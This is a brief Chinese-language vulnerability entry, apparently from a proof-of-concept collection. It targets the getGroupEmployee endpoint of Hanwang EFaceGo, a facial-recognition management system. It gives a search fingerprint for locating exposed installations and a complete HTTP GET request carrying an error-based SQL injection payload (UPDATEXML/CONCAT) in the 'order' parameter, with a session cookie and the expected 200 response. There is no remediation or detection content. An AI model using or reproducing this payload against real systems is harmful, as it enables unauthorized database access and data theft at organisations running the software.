# 汉王EFaceGOgetGroupEmployee存在SQL注入漏洞

- **系统**：汉王　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="1380907357"`
- **请求**：`GET /manage/authMultiplePeople/getGroupEmployee.do?recoToken=67mds2pxXQb&groupId=1&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=5C70A4B7AA024130B70D90E447B2C7D9`
- **预期**：200　|　—